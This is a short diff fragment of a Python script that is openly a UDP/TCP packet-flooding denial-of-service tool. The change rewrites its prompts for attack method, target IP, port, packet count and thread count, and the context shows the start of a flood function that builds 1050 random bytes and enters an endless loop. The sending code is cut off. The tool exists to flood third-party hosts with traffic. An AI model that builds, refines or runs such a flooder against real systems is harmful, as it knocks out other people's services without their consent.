@@ -25,11 +25,11 @@ print('''\033[1;36;40m
 ------------------------------------------------------------------                                                                      
                                                                       ''')
   
-  choice = str(input("\033[1;31;40mAttack Methods (Udp/Tcp) \033[1;31;40m<===> "))
-  ip = str(input("\033[1;31;40mIp Target \033[1;31;40m<===> "))
-  port = int(input("\033[1;31;40mPort Target \033[1;31;40m<===> "))
-  times = int(input("\033[1;31;40mEnter Packets \033[1;31;40m<===> "))
-  threads = int(input("\033[1;31;40mEnter Threads \033[1;31;40m<===> "))
+  choice = str(input(" Attack Methods (Udp/Tcp):<===> "))
+  ip = str(input(" IP Target ;<===> "))
+  port = int(input(" Port Target :<===> "))
+  times = int(input(" Enter Packets :<===> "))
+  threads = int(input(" Enter Threads :<===> "))
   def xxbr():
   	data = random._urandom(1050)
   	while True:
